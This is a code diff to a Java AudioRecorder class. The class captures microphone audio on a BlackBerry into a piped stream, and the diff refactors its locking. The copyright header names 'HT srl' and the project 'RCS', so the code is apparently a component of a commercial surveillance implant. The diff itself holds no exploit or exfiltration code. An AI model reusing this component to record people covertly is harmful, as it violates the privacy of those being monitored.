@@ -1,4 +1,12 @@
 //#preprocess
+
+/* *************************************************
+ * Copyright (c) 2010 - 2011
+ * HT srl,   All rights reserved.
+ * 
+ * Project      : RCS, RCSBlackBerry
+ * *************************************************/
+	
 package blackberry.record;
 
 import java.io.IOException;
@@ -30,6 +38,8 @@ public class AudioRecorder extends Thread {
 
     boolean started;
 
+    Object audioLock = new Object();
+
     //private boolean wanttostop;
 
     public AudioRecorder() {
@@ -56,7 +66,7 @@ public class AudioRecorder extends Thread {
      *            dimensione del chunk, 0 tutto il disponibile.
      * @return
      */
-    public synchronized byte[] getChunk(int size) {
+    public byte[] getChunk(int size) {
 
         if (!started) {
             //#ifdef DEBUG
@@ -74,72 +84,84 @@ public class AudioRecorder extends Thread {
         Check.requires(os != null, "getChunk: os null");
         //#endif
 
-        if (size == 0) {
-            try {
-                size = is.available();
-                //#ifdef DEBUG
-                debug.trace("getChunk available: " + size);
-                //#endif
-                if (size == 0) {
-                    return null;
-                }
-            } catch (final IOException e) {
-                //#ifdef DEBUG
-                debug.warn("available: " + e.toString());
-                //#endif
-            }
-        }
-
-        final byte[] buffer = new byte[size];
-
-        try {
-            for (int i = 0; i < size; i++) {
-                final int bb = is.read();
-                if (bb == -1) {
+        synchronized (audioLock) {
+            if (size == 0) {
+                try {
+                    size = is.available();
                     //#ifdef DEBUG
-                    debug.warn("Cannot read");
+                    debug.trace("getChunk available: " + size);
                     //#endif
-                    return null;
+                    if (size == 0) {
+                        return null;
+                    }
+                } catch (final IOException e) {
+                    //#ifdef DEBUG
+                    debug.warn("available: " + e.toString());
+                    //#endif
                 }
-                buffer[i] = (byte) bb;
             }
-        } catch (final Exception e) {
+
+            final byte[] buffer = new byte[size];
+
+            try {
+                for (int i = 0; i < size; i++) {
+                    final int bb = is.read();
+                    if (bb == -1) {
+                        //#ifdef DEBUG
+                        debug.warn("Cannot read");
+                        //#endif
+                        return null;
+                    }
+                    buffer[i] = (byte) bb;
+                }
+            } catch (final Exception e) {
+                //#ifdef DEBUG
+                debug.error(e);
+                //#endif
+                return null;
+            }
             //#ifdef DEBUG
-            debug.error(e);
+            debug.trace("getChunk: end");
             //#endif
-            return null;
+            return buffer;
         }
 
-        //#ifdef DEBUG
-        debug.trace("getChunk: end");
-        //#endif
-        return buffer;
     }
 
     //Create a Player object by invoking createPlayer() to capture audio.
-    public synchronized void run() {
+    public void run() {
         try {
             //#ifdef DEBUG
             debug.trace("Starting");
             //#endif
 
-            os = new PipedOutputStream();
-            is = new PipedInputStream(BUFFER_SIZE);
+            if (started) {
+                //#ifdef DEBUG
+                debug.error("run: already started");
+                //#endif
+                stop();
+                //return;
+            }
 
-            is.connect(os);
-            //os.write(new byte[]{0});
+            synchronized (audioLock) {
+                os = new PipedOutputStream();
+                is = new PipedInputStream(BUFFER_SIZE);
 
-            _player = Manager.createPlayer("capture://audio?encoding=amr");
-            //Invoke Player.realize().
-            _player.realize();
-            initRecord();
-            _player.start();
+                is.connect(os);
+                //os.write(new byte[]{0});
 
-            //#ifdef DEBUG
-            debug.trace("Started");
-            //#endif
+                _player = Manager.createPlayer("capture://audio?encoding=amr");
+                //Invoke Player.realize().
+                _player.realize();
+                initRecord();
+                _player.start();
 
-            started = true;
+                //#ifdef DEBUG
+                debug.trace("Started");
+                //#endif
+
+                started = true;
+            }
 
             //In a catch block, specify actions to perform if an exception occurs.
         } catch (final Exception e) {
@@ -164,7 +186,7 @@ public class AudioRecorder extends Thread {
     }
 
     //Create a try block in your implementation of the stop method, and then invoke RecordControl.commit() to stop recording audio.
-    public synchronized void stop() {
+    public void stop() {
         try {
             if (!started) {
                 //#ifdef DEBUG
@@ -173,27 +195,29 @@ public class AudioRecorder extends Thread {
                 return;
             }
 
-            started = false;
+            synchronized (audioLock) {
+                started = false;
 
-            //#ifdef DEBUG
-            debug.trace("stop");
-            //#endif            
+                //#ifdef DEBUG
+                debug.trace("stop");
+                //#endif            
 
-            is.receivedLast();
-            os.flush();
+                is.receivedLast();
+                os.flush();
 
-            //is.reset();
-            _rcontrol.commit();
-            //Invoke ByteArrayOutputStream.toByteArray() to write the audio data from the OutputStream to a byte array.
+                //is.reset();
+                _rcontrol.commit();
+                //Invoke ByteArrayOutputStream.toByteArray() to write the audio data from the OutputStream to a byte array.
 
-            //Invoke ByteArrayOutputStream.close() and Player.close() to close the OutputStream and Player.                                 
+                //Invoke ByteArrayOutputStream.close() and Player.close() to close the OutputStream and Player.                                 
 
-            os.close();
-            //is.close();
+                os.close();
+                //is.close();
 
-            _player.close();
-            //In a catch block, specify actions to perform if an exception occurs.
+                _player.close();
+                //In a catch block, specify actions to perform if an exception occurs.
 
+            }
             //#ifdef DEBUG
             debug.trace("stopped");
             //#endif 
